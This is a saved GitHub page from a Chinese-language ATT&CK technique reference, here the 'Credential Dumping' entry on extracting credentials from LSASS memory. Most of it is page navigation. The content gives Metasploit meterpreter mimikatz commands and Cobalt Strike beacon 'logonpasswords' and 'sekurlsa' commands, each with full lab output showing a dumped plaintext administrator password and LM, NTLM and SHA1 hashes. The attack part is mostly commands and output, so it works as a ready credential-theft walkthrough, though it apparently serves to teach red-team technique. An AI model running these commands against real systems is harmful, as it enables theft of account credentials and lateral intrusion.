      <svg class="octicon octicon-git-pull-request" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M11 11.28V5c-.03-.78-.34-1.47-.94-2.06C9.46 2.35 8.78 2.03 8 2H7V0L4 3l3 3V4h1c.27.02.48.11.69.31.21.2.3.42.31.69v6.28A1.993 1.993 0 0 0 10 15a1.993 1.993 0 0 0 1-3.72zm-1 2.92c-.66 0-1.2-.55-1.2-1.2 0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2 0 .65-.55 1.2-1.2 1.2zM4 3c0-1.11-.89-2-2-2a1.993 1.993 0 0 0-1 3.72v6.56A1.993 1.993 0 0 0 2 15a1.993 1.993 0 0 0 1-3.72V4.72c.59-.34 1-.98 1-1.72zm-.8 10c0 .66-.55 1.2-1.2 1.2-.65 0-1.2-.55-1.2-1.2 0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2zM2 4.2C1.34 4.2.8 3.65.8 3c0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2 0 .65-.55 1.2-1.2 1.2z"></path></svg>
      <span itemprop="name">Pull requests</span>
      <span class="Counter">0</span>
      <meta itemprop="position" content="3">
</a>  </span>


    <a data-hotkey="g b" class="js-selected-navigation-item reponav-item" data-selected-links="repo_projects new_repo_project repo_project /lengjibo/ATT-CK-CN/projects" href="https://github.com/lengjibo/ATT-CK-CN/projects">
      <svg class="octicon octicon-project" viewBox="0 0 15 16" version="1.1" width="15" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M10 12h3V2h-3v10zm-4-2h3V2H6v8zm-4 4h3V2H2v12zm-1 1h13V1H1v14zM14 0H1a1 1 0 0 0-1 1v14a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1V1a1 1 0 0 0-1-1z"></path></svg>
      Projects
      <span class="Counter">0</span>
</a>

    <a class="js-selected-navigation-item reponav-item" data-hotkey="g w" data-selected-links="repo_wiki /lengjibo/ATT-CK-CN/wiki" href="https://github.com/lengjibo/ATT-CK-CN/wiki">
      <svg class="octicon octicon-book" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M3 5h4v1H3V5zm0 3h4V7H3v1zm0 2h4V9H3v1zm11-5h-4v1h4V5zm0 2h-4v1h4V7zm0 2h-4v1h4V9zm2-6v9c0 .55-.45 1-1 1H9.5l-1 1-1-1H2c-.55 0-1-.45-1-1V3c0-.55.45-1 1-1h5.5l1 1 1-1H15c.55 0 1 .45 1 1zm-8 .5L7.5 3H2v9h6V3.5zm7-.5H9.5l-.5.5V12h6V3z"></path></svg>
      Wiki
</a>
    <a data-skip-pjax="true" class="js-selected-navigation-item reponav-item" data-selected-links="security alerts policy code_scanning /lengjibo/ATT-CK-CN/security/advisories" href="https://github.com/lengjibo/ATT-CK-CN/security/advisories">
      <svg class="octicon octicon-shield" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M0 2l7-2 7 2v6.02C14 12.69 8.69 16 7 16c-1.69 0-7-3.31-7-7.98V2zm1 .75L7 1l6 1.75v5.268C13 12.104 8.449 15 7 15c-1.449 0-6-2.896-6-6.982V2.75zm1 .75L7 2v12c-1.207 0-5-2.482-5-5.985V3.5z"></path></svg>
      Security
</a>
    <a class="js-selected-navigation-item reponav-item" data-selected-links="repo_graphs repo_contributors dependency_graph pulse people /lengjibo/ATT-CK-CN/pulse" href="https://github.com/lengjibo/ATT-CK-CN/pulse">
      <svg class="octicon octicon-graph" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M16 14v1H0V0h1v14h15zM5 13H3V8h2v5zm4 0H7V3h2v10zm4 0h-2V6h2v7z"></path></svg>
      Insights
</a>

</nav>

  <div class="reponav-wrapper reponav-small d-lg-none">
  <nav class="reponav js-reponav text-center no-wrap" itemscope="" itemtype="http://schema.org/BreadcrumbList">

    <span itemscope="" itemtype="http://schema.org/ListItem" itemprop="itemListElement">
      <a class="js-selected-navigation-item selected reponav-item" itemprop="url" aria-current="page" data-selected-links="repo_source repo_downloads repo_commits repo_releases repo_tags repo_branches repo_packages /lengjibo/ATT-CK-CN" href="https://github.com/lengjibo/ATT-CK-CN">
        <span itemprop="name">Code</span>
        <meta itemprop="position" content="1">
</a>    </span>

      <span itemscope="" itemtype="http://schema.org/ListItem" itemprop="itemListElement">
        <a itemprop="url" class="js-selected-navigation-item reponav-item" data-selected-links="repo_issues repo_labels repo_milestones /lengjibo/ATT-CK-CN/issues" href="https://github.com/lengjibo/ATT-CK-CN/issues">
          <span itemprop="name">Issues</span>
          <span class="Counter">0</span>
          <meta itemprop="position" content="2">
</a>      </span>

    <span itemscope="" itemtype="http://schema.org/ListItem" itemprop="itemListElement">
      <a itemprop="url" class="js-selected-navigation-item reponav-item" data-selected-links="repo_pulls checks /lengjibo/ATT-CK-CN/pulls" href="https://github.com/lengjibo/ATT-CK-CN/pulls">
        <span itemprop="name">Pull requests</span>
        <span class="Counter">0</span>
        <meta itemprop="position" content="3">
</a>    </span>

      <span itemscope="" itemtype="http://schema.org/ListItem" itemprop="itemListElement">
        <a itemprop="url" class="js-selected-navigation-item reponav-item" data-selected-links="repo_projects new_repo_project repo_project /lengjibo/ATT-CK-CN/projects" href="https://github.com/lengjibo/ATT-CK-CN/projects">
          <span itemprop="name">Projects</span>
          <span class="Counter">0</span>
          <meta itemprop="position" content="4">
</a>      </span>

      <span itemscope="" itemtype="http://schema.org/ListItem" itemprop="itemListElement">
        <a itemprop="url" class="js-selected-navigation-item reponav-item" data-selected-links="repo_wiki /lengjibo/ATT-CK-CN/wiki" href="https://github.com/lengjibo/ATT-CK-CN/wiki">
          <span itemprop="name">Wiki</span>
          <meta itemprop="position" content="5">
</a>      </span>

      <a itemprop="url" class="js-selected-navigation-item reponav-item" data-selected-links="security alerts policy code_scanning /lengjibo/ATT-CK-CN/security/advisories" href="https://github.com/lengjibo/ATT-CK-CN/security/advisories">
        <span itemprop="name">Security</span>
        <meta itemprop="position" content="6">
</a>
      <a class="js-selected-navigation-item reponav-item" data-selected-links="pulse /lengjibo/ATT-CK-CN/pulse" href="https://github.com/lengjibo/ATT-CK-CN/pulse">
        Pulse
</a>
      <span itemscope="" itemtype="http://schema.org/ListItem" itemprop="itemListElement">
        <a itemprop="url" class="js-selected-navigation-item reponav-item" data-selected-links="community /lengjibo/ATT-CK-CN/community" href="https://github.com/lengjibo/ATT-CK-CN/community">
          Community
</a>      </span>

  </nav>
</div>


  </div>
<div class="container-lg clearfix new-discussion-timeline experiment-repo-nav  p-responsive">
  <div class="repository-content ">

    
    


  


    <a class="d-none js-permalink-shortcut" data-hotkey="y" href="https://github.com/lengjibo/ATT-CK-CN/blob/85dd872373810af4261df8cb56c77eaecae474fa/ATT%26CK%E6%A8%A1%E5%9E%8B.md">Permalink</a>

    <!-- blob contrib key: blob_contributors:v21:aedef1f9b1a6454f4b2ff44aa49e956a -->
      

    <div class="d-flex flex-items-start flex-shrink-0 pb-3 flex-column flex-md-row">
      <span class="d-flex flex-justify-between width-full width-md-auto">
        
<details class="details-reset details-overlay select-menu branch-select-menu  hx_rsm" id="branch-select-menu">
  <summary class="btn btn-sm select-menu-button css-truncate" data-hotkey="w" title="Switch branches or tags" aria-haspopup="menu">
    <i>Branch:</i>
    <span class="css-truncate-target" data-menu-button="">master</span>
  </summary>

  <details-menu class="select-menu-modal hx_rsm-modal position-absolute" style="z-index: 99;" src="/lengjibo/ATT-CK-CN/ref-list/master/ATT&amp;CK%E6%A8%A1%E5%9E%8B.md?source_action=show&amp;source_controller=blob" preload="" role="menu">
    <include-fragment class="select-menu-loading-overlay anim-pulse">
      <svg height="32" class="octicon octicon-octoface" viewBox="0 0 16 16" version="1.1" width="32" aria-hidden="true"><path fill-rule="evenodd" d="M14.7 5.34c.13-.32.55-1.59-.13-3.31 0 0-1.05-.33-3.44 1.3-1-.28-2.07-.32-3.13-.32s-2.13.04-3.13.32c-2.39-1.64-3.44-1.3-3.44-1.3-.68 1.72-.26 2.99-.13 3.31C.49 6.21 0 7.33 0 8.69 0 13.84 3.33 15 7.98 15S16 13.84 16 8.69c0-1.36-.49-2.48-1.3-3.35zM8 14.02c-3.3 0-5.98-.15-5.98-3.35 0-.76.38-1.48 1.02-2.07 1.07-.98 2.9-.46 4.96-.46 2.07 0 3.88-.52 4.96.46.65.59 1.02 1.3 1.02 2.07 0 3.19-2.68 3.35-5.98 3.35zM5.49 9.01c-.66 0-1.2.8-1.2 1.78s.54 1.79 1.2 1.79c.66 0 1.2-.8 1.2-1.79s-.54-1.78-1.2-1.78zm5.02 0c-.66 0-1.2.79-1.2 1.78s.54 1.79 1.2 1.79c.66 0 1.2-.8 1.2-1.79s-.53-1.78-1.2-1.78z"></path></svg>
    </include-fragment>
  </details-menu>
</details>

        <div class="BtnGroup flex-shrink-0 d-md-none">
          <a href="https://github.com/lengjibo/ATT-CK-CN/find/master" class="js-pjax-capture-input btn btn-sm BtnGroup-item" data-pjax="" data-hotkey="t">
            Find file
          </a>
          <clipboard-copy value="ATT&amp;CK模型.md" class="btn btn-sm BtnGroup-item" tabindex="0" role="button">
            Copy path
          </clipboard-copy>
        </div>
      </span>
      <h2 id="blob-path" class="breadcrumb flex-auto min-width-0 text-normal flex-md-self-center ml-md-2 mr-md-3 my-2 my-md-0">
        <span class="js-repo-root text-bold"><span class="js-path-segment"><a data-pjax="true" href="https://github.com/lengjibo/ATT-CK-CN"><span>ATT-CK-CN</span></a></span></span><span class="separator">/</span><strong class="final-path">ATT&amp;CK模型.md</strong>
      </h2>

      <div class="BtnGroup flex-shrink-0 d-none d-md-inline-block">
        <a href="https://github.com/lengjibo/ATT-CK-CN/find/master" class="js-pjax-capture-input btn btn-sm BtnGroup-item" data-pjax="" data-hotkey="t">
          Find file
        </a>
        <clipboard-copy value="ATT&amp;CK模型.md" class="btn btn-sm BtnGroup-item" tabindex="0" role="button">
          Copy path
        </clipboard-copy>
      </div>
    </div>



    
  <div class="Box Box--condensed d-flex flex-column flex-shrink-0">
      <div class="Box-body d-flex flex-justify-between bg-blue-light flex-column flex-md-row flex-items-start flex-md-items-center">
        <span class="pr-md-4 f6">
          <a rel="author" data-skip-pjax="true" data-hovercard-type="user" data-hovercard-url="/hovercards?user_id=31297202" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/lengjibo"><img class="avatar" src="./ATT-CK-CN_ATT&amp;CK模型.md at master · lengjibo_ATT-CK-CN_files/31297202" width="20" height="20" alt="@lengjibo"></a>
          <a class="text-bold link-gray-dark lh-default v-align-middle" rel="author" data-hovercard-type="user" data-hovercard-url="/hovercards?user_id=31297202" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/lengjibo">lengjibo</a>
            <span class="lh-default v-align-middle">
              <a data-pjax="true" title="Add files via upload" class="link-gray" href="https://github.com/lengjibo/ATT-CK-CN/commit/85dd872373810af4261df8cb56c77eaecae474fa">Add files via upload</a>
            </span>
        </span>
        <span class="d-inline-block flex-shrink-0 v-align-bottom f6 mt-2 mt-md-0">
          <a class="pr-2 text-mono link-gray" href="https://github.com/lengjibo/ATT-CK-CN/commit/85dd872373810af4261df8cb56c77eaecae474fa" data-pjax="">85dd872</a>
          <relative-time datetime="2019-09-07T14:20:05Z" title="2019年9月7日 GMT+8 下午10:20">8 days ago</relative-time>
        </span>
      </div>

    <div class="Box-body d-flex flex-items-center flex-auto f6 border-bottom-0 flex-wrap">
      <details class="details-reset details-overlay details-overlay-dark lh-default text-gray-dark float-left mr-2" id="blob_contributors_box">
        <summary class="btn-link" role="button">
          <span><strong>1</strong> contributor</span>
        </summary>
        <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast" aria-label="Users who have contributed to this file" src="/lengjibo/ATT-CK-CN/contributors/master/ATT&amp;CK%E6%A8%A1%E5%9E%8B.md/list" preload="" role="dialog" aria-modal="true">
          <div class="Box-header">
            <button class="Box-btn-octicon btn-octicon float-right" type="button" aria-label="Close dialog" data-close-dialog="">
              <svg class="octicon octicon-x" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48L7.48 8z"></path></svg>
            </button>
            <h3 class="Box-title">
              Users who have contributed to this file
            </h3>
          </div>
          <include-fragment class="octocat-spinner my-3" aria-label="Loading..."></include-fragment>
        </details-dialog>
      </details>
    </div>
  </div>





    <div class="Box mt-3 position-relative">
      
<div class="Box-header py-2 d-flex flex-column flex-shrink-0 flex-md-row flex-md-items-center">

  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
      3693 lines (2791 sloc)
      <span class="file-info-divider"></span>
    133 KB
  </div>

  <div class="d-flex py-1 py-md-0 flex-auto flex-order-1 flex-md-order-2 flex-sm-grow-0 flex-justify-between">

    <div class="BtnGroup">
      <a id="raw-url" class="btn btn-sm BtnGroup-item" href="https://github.com/lengjibo/ATT-CK-CN/raw/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md">Raw</a>
        <a class="btn btn-sm js-update-url-with-hash BtnGroup-item" data-hotkey="b" href="https://github.com/lengjibo/ATT-CK-CN/blame/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md">Blame</a>
      <a rel="nofollow" class="btn btn-sm BtnGroup-item" href="https://github.com/lengjibo/ATT-CK-CN/commits/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md">History</a>
    </div>


    <div>
            <a class="btn-octicon tooltipped tooltipped-nw hide-sm" href="https://desktop.github.com/" aria-label="Open this file in GitHub Desktop" data-ga-click="Repository, open with desktop, type:windows">
                <svg class="octicon octicon-device-desktop" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M15 2H1c-.55 0-1 .45-1 1v9c0 .55.45 1 1 1h5.34c-.25.61-.86 1.39-2.34 2h8c-1.48-.61-2.09-1.39-2.34-2H15c.55 0 1-.45 1-1V3c0-.55-.45-1-1-1zm0 9H1V3h14v8z"></path></svg>
            </a>

            <!-- '"` --><!-- </textarea></xmp> --><form class="inline-form js-update-url-with-hash" action="https://github.com/lengjibo/ATT-CK-CN/edit/master/ATT&amp;CK%E6%A8%A1%E5%9E%8B.md" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="9PyQK9mVlHpeTdUK6SBGP0vVKMjT6/Si36sW7q2ul4Y7MkVH8iGItY6KDWJHsySkTIbKsty2yazg6Rxs0MXu3w==">
              <button class="btn-octicon tooltipped tooltipped-nw" type="submit" aria-label="Fork this project and edit the file" data-hotkey="e" data-disable-with="">
                <svg class="octicon octicon-pencil" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M0 12v3h3l8-8-3-3-8 8zm3 2H1v-2h1v1h1v1zm10.3-9.3L12 6 9 3l1.3-1.3a.996.996 0 0 1 1.41 0l1.59 1.59c.39.39.39 1.02 0 1.41z"></path></svg>
              </button>
</form>
          <!-- '"` --><!-- </textarea></xmp> --><form class="inline-form" action="https://github.com/lengjibo/ATT-CK-CN/delete/master/ATT&amp;CK%E6%A8%A1%E5%9E%8B.md" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="QS0mteXu5C532nNgBMXi432l1kj5NLKyyVQ8cVmV20RN7pAG4r4j8vY/rj/RBQdDEfUBatGo3VNIJ0dvX8sCUQ==">
            <button class="btn-octicon btn-octicon-danger tooltipped tooltipped-nw" type="submit" aria-label="Fork this project and delete the file" data-disable-with="">
              <svg class="octicon octicon-trashcan" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M11 2H9c0-.55-.45-1-1-1H5c-.55 0-1 .45-1 1H2c-.55 0-1 .45-1 1v1c0 .55.45 1 1 1v9c0 .55.45 1 1 1h7c.55 0 1-.45 1-1V5c.55 0 1-.45 1-1V3c0-.55-.45-1-1-1zm-1 12H3V5h1v8h1V5h1v8h1V5h1v8h1V5h1v9zm1-10H2V3h9v1z"></path></svg>
            </button>
</form>    </div>
  </div>
</div>




      
  <div id="readme" class="Box-body readme blob instapaper_body js-code-block-container">
    <article class="markdown-body entry-content p-3 p-md-6" itemprop="text"><h2><a id="user-content-credential-dumping凭证窃取" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#credential-dumping%E5%87%AD%E8%AF%81%E7%AA%83%E5%8F%96"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Credential Dumping(凭证窃取)</h2>
<h3><a id="user-content-dump-credentials-from-lsass从lsass中窃取凭证" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#dump-credentials-from-lsass%E4%BB%8Elsass%E4%B8%AD%E7%AA%83%E5%8F%96%E5%87%AD%E8%AF%81"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Dump credentials from LSASS(从LSASS中窃取凭证)</h3>
<p>实现原理：</p>
<pre><code>This technique injects into the LSASS.exe process and scrapes its memory for plaintext passwords of logged on users. You must do this from a high integrity process. 

注入lsass .exe进程，并从其内存中提取登录用户的明文密码
</code></pre>
<h4><a id="user-content-msf下操作" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>use mimikatz</p>
<p>wdigest(获取WDigest凭据)</p>
<p>msv （获取msv凭据（hash））</p>
<p>kerberos （获取kerberos）</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>meterpreter <span class="pl-k">&gt;</span> use mimikatz 
Loading extension mimikatz...Success.
meterpreter <span class="pl-k">&gt;</span> wdigest 
[<span class="pl-k">!</span>] Not currently running as SYSTEM
[<span class="pl-k">*</span>] Attempting to getprivs ...
[+] Got SeDebugPrivilege.
[<span class="pl-k">*</span>] Retrieving wdigest credentials
wdigest credentials
===================

AuthID    Package    Domain           User              Password
------    -------    ------           ----              --------
0<span class="pl-k">;</span>996     Negotiate  NT AUTHORITY     NETWORK SERVICE   
0<span class="pl-k">;</span>53216   NTLM                                          
0<span class="pl-k">;</span>997     Negotiate  NT AUTHORITY     LOCAL SERVICE     
0<span class="pl-k">;</span>999     NTLM       WORKGROUP        ROOT-5DE52AC98B$  
0<span class="pl-k">;</span>146131  NTLM       ROOT-5DE52AC98B  Administrator     123456

meterpreter <span class="pl-k">&gt;</span> msv
[<span class="pl-k">!</span>] Not currently running as SYSTEM
[<span class="pl-k">*</span>] Attempting to getprivs ...
[+] Got SeDebugPrivilege.
[<span class="pl-k">*</span>] Retrieving msv credentials
msv credentials
===============

AuthID    Package    Domain           User              Password
------    -------    ------           ----              --------
0<span class="pl-k">;</span>146131  NTLM       ROOT-5DE52AC98B  Administrator     lm{ 44efce164ab921caaad3b435b51404ee }, ntlm{ 32ed87bdb5fdc5e9cba88547376818d4 }
0<span class="pl-k">;</span>996     Negotiate  NT AUTHORITY     NETWORK SERVICE   lm{ aad3b435b51404eeaad3b435b51404ee }, ntlm{ 31d6cfe0d16ae931b73c59d7e0c089c0 }
0<span class="pl-k">;</span>53216   NTLM                                          n.s. (Credentials KO)
0<span class="pl-k">;</span>997     Negotiate  NT AUTHORITY     LOCAL SERVICE     n.s. (Credentials KO)
0<span class="pl-k">;</span>999     NTLM       WORKGROUP        ROOT-5DE52AC98B$  n.s. (Credentials KO)
meterpreter <span class="pl-k">&gt;</span> kerberos 
[<span class="pl-k">!</span>] Not currently running as SYSTEM
[<span class="pl-k">*</span>] Attempting to getprivs ...
[+] Got SeDebugPrivilege.
[<span class="pl-k">*</span>] Retrieving kerberos credentials
kerberos credentials
====================

AuthID    Package    Domain           User              Password
------    -------    ------           ----              --------
0<span class="pl-k">;</span>996     Negotiate  NT AUTHORITY     NETWORK SERVICE   
0<span class="pl-k">;</span>53216   NTLM                                          
0<span class="pl-k">;</span>997     Negotiate  NT AUTHORITY     LOCAL SERVICE     
0<span class="pl-k">;</span>999     NTLM       WORKGROUP        ROOT-5DE52AC98B$  
0<span class="pl-k">;</span>146131  NTLM       ROOT-5DE52AC98B  Administrator     123456
</pre></div>
<h4><a id="user-content-cs下操作" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作</h4>
<blockquote>
<p>logonpasswords</p>
<p>mimikatz !sekurlsa::logonpasswords</p>
<p>mimikatz !sekurlsa::msv</p>
<p>mimikatz !sekurlsa::kerberos</p>
<p>mimikatz !sekurlsa::wdigest</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>beacon<span class="pl-k">&gt;</span> logonpasswords
[<span class="pl-k">*</span>] Tasked beacon to run mimikatz<span class="pl-s"><span class="pl-pds">'</span>s sekurlsa::logonpasswords command</span>
<span class="pl-s">[+] host called home, sent: 630354 bytes</span>
<span class="pl-s">[+] received output:</span>
<span class="pl-s"></span>
<span class="pl-s">Authentication Id : 0 ; 338316 (00000000:0005298c)</span>
<span class="pl-s">Session           : Interactive from 0</span>
<span class="pl-s">User Name         : Administrator</span>
<span class="pl-s">Domain            : ROOT-5DE52AC98B</span>
<span class="pl-s">Logon Server      : ROOT-5DE52AC98B</span>
<span class="pl-s">Logon Time        : 2019-9-4 19:18:26</span>
<span class="pl-s">SID               : S-1-5-21-1911985068-4225083820-4011728908-500</span>
<span class="pl-s">	msv :	</span>
<span class="pl-s">	 [00000002] Primary</span>
<span class="pl-s">	 * Username : Administrator</span>
<span class="pl-s">	 * Domain   : ROOT-5DE52AC98B</span>
<span class="pl-s">	 * LM       : 44efce164ab921caaad3b435b51404ee</span>
<span class="pl-s">	 * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4</span>
<span class="pl-s">	 * SHA1     : 6ed5833cf35286ebf8662b7b5949f0d742bbec3f</span>
<span class="pl-s">	wdigest :	</span>
<span class="pl-s">	 * Username : Administrator</span>
<span class="pl-s">	 * Domain   : ROOT-5DE52AC98B</span>
<span class="pl-s">	 * Password : 123456</span>
<span class="pl-s">	kerberos :	</span>
<span class="pl-s">	 * Username : Administrator</span>
<span class="pl-s">	 * Domain   : ROOT-5DE52AC98B</span>
<span class="pl-s">	 * Password : 123456</span>
<span class="pl-s">	ssp :	</span>
<span class="pl-s">	credman :	</span>
<span class="pl-s"></span>
<span class="pl-s">Authentication Id : 0 ; 996 (00000000:000003e4)</span>
<span class="pl-s">Session           : Service from 0</span>
<span class="pl-s">User Name         : NETWORK SERVICE</span>
<span class="pl-s">Domain            : NT AUTHORITY</span>
<span class="pl-s">Logon Server      : (null)</span>
<span class="pl-s">Logon Time        : 2019-9-4 19:14:12</span>
<span class="pl-s">SID               : S-1-5-20</span>
<span class="pl-s">	msv :	</span>
<span class="pl-s">	 [00000002] Primary</span>
<span class="pl-s">	 * Username : ROOT-5DE52AC98B$</span>
<span class="pl-s">	 * Domain   : WORKGROUP</span>
<span class="pl-s">	 * LM       : aad3b435b51404eeaad3b435b51404ee</span>
<span class="pl-s">	 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0</span>
<span class="pl-s">	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709</span>
<span class="pl-s">	wdigest :	</span>
<span class="pl-s">	 * Username : ROOT-5DE52AC98B$</span>
<span class="pl-s">	 * Domain   : WORKGROUP</span>
<span class="pl-s">	 * Password : (null)</span>
<span class="pl-s">	kerberos :	</span>
<span class="pl-s">	 * Username : root-5de52ac98b$</span>
<span class="pl-s">	 * Domain   : WORKGROUP</span>
<span class="pl-s">	 * Password : (null)</span>
<span class="pl-s">	ssp :	</span>
<span class="pl-s">	credman :	</span>
<span class="pl-s"></span>
<span class="pl-s">Authentication Id : 0 ; 997 (00000000:000003e5)</span>
<span class="pl-s">Session           : Service from 0</span>
<span class="pl-s">User Name         : LOCAL SERVICE</span>
<span class="pl-s">Domain            : NT AUTHORITY</span>
<span class="pl-s">Logon Server      : (null)</span>
<span class="pl-s">Logon Time        : 2019-9-4 19:14:12</span>
<span class="pl-s">SID               : S-1-5-19</span>
<span class="pl-s">	msv :	</span>
<span class="pl-s">	wdigest :	</span>
<span class="pl-s">	kerberos :	</span>
<span class="pl-s">	 * Username : (null)</span>
<span class="pl-s">	 * Domain   : (null)</span>
<span class="pl-s">	 * Password : (null)</span>
<span class="pl-s">	ssp :	</span>
<span class="pl-s">	credman :	</span>
<span class="pl-s"></span>
<span class="pl-s">Authentication Id : 0 ; 53331 (00000000:0000d053)</span>
<span class="pl-s">Session           : UndefinedLogonType from 0</span>
<span class="pl-s">User Name         : (null)</span>
<span class="pl-s">Domain            : (null)</span>
<span class="pl-s">Logon Server      : (null)</span>
<span class="pl-s">Logon Time        : 2019-9-4 19:14:12</span>
<span class="pl-s">SID               : </span>
<span class="pl-s">	msv :	</span>
<span class="pl-s">	wdigest :	</span>
<span class="pl-s">	kerberos :	</span>
<span class="pl-s">	ssp :	</span>
<span class="pl-s">	credman :	</span>
<span class="pl-s"></span>
<span class="pl-s">Authentication Id : 0 ; 999 (00000000:000003e7)</span>
<span class="pl-s">Session           : UndefinedLogonType from 0</span>
<span class="pl-s">User Name         : ROOT-5DE52AC98B$</span>
<span class="pl-s">Domain            : WORKGROUP</span>
<span class="pl-s">Logon Server      : (null)</span>
<span class="pl-s">Logon Time        : 2019-9-4 19:14:12</span>
<span class="pl-s">SID               : S-1-5-18</span>
<span class="pl-s">	msv :	</span>
<span class="pl-s">	wdigest :	</span>
<span class="pl-s">	kerberos :	</span>
<span class="pl-s">	 * Username : root-5de52ac98b$</span>
<span class="pl-s">	 * Domain   : WORKGROUP</span>
<span class="pl-s">	 * Password : (null)</span>
<span class="pl-s">	ssp :	</span>
<span class="pl-s">	credman :	</span></pre></div>
